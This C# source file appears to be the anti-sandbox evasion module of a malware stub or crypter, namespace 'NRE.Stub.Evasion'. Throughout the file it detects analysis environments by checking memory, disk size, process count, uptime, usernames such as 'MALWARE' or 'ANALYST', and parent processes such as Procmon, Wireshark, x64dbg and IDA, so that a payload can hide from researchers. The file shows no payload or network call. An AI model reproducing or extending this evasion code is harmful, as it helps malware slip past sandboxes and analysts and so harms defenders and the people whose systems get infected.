using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Management;

namespace NRE.Stub.Evasion
{
    /// <summary>
    /// Anti-sandbox: RAM, disk, process count, uptime, username, debugger parent.
    /// </summary>
    public static class AntiSandbox
    {
        private const uint MIN_RAM_MB = 2048;
        private const ulong MIN_DISK_GB = 60;
        private const int MIN_PROCESS_COUNT = 50;
        private const int MIN_UPTIME_MINUTES = 5;

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetPhysicallyInstalledSystemMemory(out ulong TotalMemoryInKilobytes);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetDiskFreeSpaceExW(
            string lpDirectoryName,
            out ulong lpFreeBytesAvailableToCaller,
            out ulong lpTotalNumberOfBytes,
            out ulong lpTotalNumberOfFreeBytes);

        public static bool IsSandboxed()
        {
            if (LowMemory()) return true;
            if (SmallDisk()) return true;
            if (LowProcessCount()) return true;
            if (ShortUptime()) return true;
            if (SuspiciousUsername()) return true;
            if (DebuggerParent()) return true;
            return false;
        }

        private static bool LowMemory()
        {
            try
            {
                ulong memKb;
                if (GetPhysicallyInstalledSystemMemory(out memKb))
                {
                    var memMb = memKb / 1024;
                    if (memMb < MIN_RAM_MB) return true;
                }
            }
            catch { }
            return false;
        }

        private static bool SmallDisk()
        {
            try
            {
                ulong free, total, freeTotal;
                if (GetDiskFreeSpaceExW("C:\\", out free, out total, out freeTotal))
                {
                    var gb = total / (1024UL * 1024 * 1024);
                    if (gb < MIN_DISK_GB) return true;
                }
            }
            catch { }
            return false;
        }

        private static bool LowProcessCount()
        {
            try
            {
                var count = Process.GetProcesses().Length;
                if (count < MIN_PROCESS_COUNT) return true;
            }
            catch { }
            return false;
        }

        private static bool ShortUptime()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT LastBootUpTime FROM Win32_OperatingSystem"))
                {
                    foreach (var obj in searcher.Get())
                    {
                        var boot = obj["LastBootUpTime"] != null ? obj["LastBootUpTime"].ToString() : null;
                        if (string.IsNullOrEmpty(boot)) continue;
                        var dt = ManagementDateTimeConverter.ToDateTime(boot);
                        var span = DateTime.UtcNow - dt.ToUniversalTime();
                        if (span.TotalMinutes < MIN_UPTIME_MINUTES) return true;
                        break;
                    }
                }
            }
            catch { }
            return false;
        }

        private static bool SuspiciousUsername()
        {
            try
            {
                var user = (Environment.UserName ?? "").ToUpperInvariant();
                var sandboxNames = new[] { "SANDBOX", "MALWARE", "VIRUS", "SAMPLE", "TEST", "ANALYSIS", "ANALYST" };
                foreach (var name in sandboxNames)
                    if (user.Contains(name)) return true;
            }
            catch { }
            return false;
        }

        private static bool DebuggerParent()
        {
            try
            {
                var me = Process.GetCurrentProcess();
                var parent = ParentProcessUtilities.GetParentProcess(me.Id);
                if (parent == null) return false;
                var pname = (parent.ProcessName ?? "").ToUpperInvariant();
                // Analysis/sandbox tools only; avoid PYTHON/PYTHONW (false positives when run from IDE/script)
                var sandboxExes = new[] { "PROCMON", "PROCEXP", "PROCEXP64", "WIRESHARK", "DUMPIT", "FTK", "X64DBG", "OLLYDBG", "IDAG" };
                foreach (var exe in sandboxExes)
                    if (pname.Contains(exe)) return true;
            }
            catch { }
            return false;
        }
    }

    internal static class ParentProcessUtilities
    {
        [DllImport("ntdll.dll")]
        private static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, IntPtr processInformation, int processInformationLength, out int returnLength);

        private const int ProcessBasicInformation = 0;

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebBaseAddress;
            public IntPtr Reserved2_0;
            public IntPtr Reserved2_1;
            public IntPtr UniqueProcessId;
            public IntPtr InheritedFromUniqueProcessId;
        }

        public static Process GetParentProcess(int id)
        {
            try
            {
                var proc = Process.GetProcessById(id);
                var handle = proc.Handle;
                var size = Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION));
                var buf = Marshal.AllocHGlobal(size);
                try
                {
                    int retLen;
                    if (NtQueryInformationProcess(handle, ProcessBasicInformation, buf, size, out retLen) != 0)
                        return null;
                    var pbi = (PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(buf, typeof(PROCESS_BASIC_INFORMATION));
                    var parentId = pbi.InheritedFromUniqueProcessId.ToInt32();
                    if (parentId <= 0) return null;
                    return Process.GetProcessById(parentId);
                }
                finally
                {
                    Marshal.FreeHGlobal(buf);
                }
            }
            catch
            {
                return null;
            }
        }
    }
}
